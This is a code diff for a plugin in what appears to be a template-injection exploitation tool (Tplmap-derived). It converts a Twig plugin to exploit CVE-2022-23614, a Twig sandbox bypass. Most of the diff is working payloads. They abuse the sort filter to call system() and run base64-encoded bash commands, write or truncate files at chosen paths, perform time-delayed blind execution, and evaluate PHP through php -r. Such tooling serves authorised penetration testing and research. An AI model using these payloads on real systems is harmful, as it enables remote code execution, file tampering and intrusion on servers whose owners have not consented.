@@ -3,14 +3,18 @@ from core import bash
 from utils import rand
 
 
-class Twig_filter(php.Php):
-    legacy_plugin = True
-    priority = 7
+class Twig_CVE(php.Php):
+    priority = 6
     plugin_info = {
-        "Description": """Mostly mirrors 'Twig' plugin, but supports versions >=2.10 and >=3.0""",
+        "Description": """Sandboxed Twig template engine vulnerable to CVE-2022-23614""",
+        "Usage notes": """Exploits CVE-2022-23614, bypassing sandbox in Twig of versions >=2.12 <2.14.11 and >=3.0 <3.3.8
+This plugin also works for Twig of versions >=2.12 and >=3.0 without sandbox, covered by Twig plugin""",
         "Authors": [
-            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Automatic payload for Twig >=2.10
+            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Automatic payload for CVE-2022-23614
             "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload for older versions of Twig
+        ],
+        "References": [
+            "CVE-2022-23614: https://nvd.nist.gov/vuln/detail/CVE-2022-23614",
         ],
         "Engine": [
             "Homepage: https://twig.symfony.com/",
@@ -19,24 +23,24 @@ class Twig_filter(php.Php):
     }
 
     def init(self):
-        # Similar to CVE-2022-23614, but worked for some older versions
-        # Only functions with 1 parameter can be mapped and eval()/assert() functions are not
-        # allowed. For this reason, most of the stuff is done by exec() instead of eval()-like code.
+        # Using CVE-2022-23614, it is possible to exploit Twig >=2.12 <2.14.11; >=3.0 <3.3.8
         self.update_actions({
             'render': {
                 'render': '{code}',
                 # Disable errors, so that "system" will not corrupt the output with a warning
-                'header': '{{% for a in {{"0":"error_reporting"}}|map("ini_set") %}}{{% endfor %}}{{{{{header[0]}+{header[1]}}}}}',
+                'header': '{{% for a in ["error_reporting", "0"]|sort("ini_set") %}}{{% endfor %}}{{{{{header[0]}+{header[1]}}}}}',
                 'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                 # {{7*'7'}} and a{#b#}c work in freemarker as well
                 # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
-                'test_render': f'{{{{(1..3)|filter(x => x < 3)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
-                'test_render_expected': f'12{rand.randstrings[0]}<br />'
+                'test_render': f'{{{{(1..3)|sort((x, y) => x < y)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
+                'test_render_expected': f'321{rand.randstrings[0]}<br />'
             },
+            # CVE-2022-23614 exploitation is heavily restricted, no known payload
+            'render_error': None,
             'write': {
                 'call': 'inject',
-                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'"]|filter("system") }}}}""",
-                'truncate': """{{{{ ["echo -n >{path}"]|filter("system") }}}}"""
+                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'", ""]|sort("system") }}}}""",
+                'truncate': """{{{{ ["echo -n >{path}", ""]|sort("system") }}}}"""
             },
             # Hackish way to evaluate PHP code
             'evaluate': {
@@ -47,28 +51,27 @@ class Twig_filter(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{% set foo=[] %}}{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'"]|filter("system") %}}{{% endfor %}}""",
+                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
-                'test_cmd_expected': rand.randstrings[2]
+                'test_cmd_expected': rand.randstrings[2] 
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'"]|filter("system") }}}}"""
+                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
             },
             'evaluate_blind': {
                 'call': 'execute',
                 'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
             },
         })
-
+        
         self.set_contexts([
             # Text context, no closures
             {'level': 0},
             {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
             {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
             {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
-            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '',
-             'closures': php.ctx_closures},
+            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': php.ctx_closures},
             # This escapes string "inter#{"asd"}polation"
             {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
             # This escapes string {% set %s = 1 %}
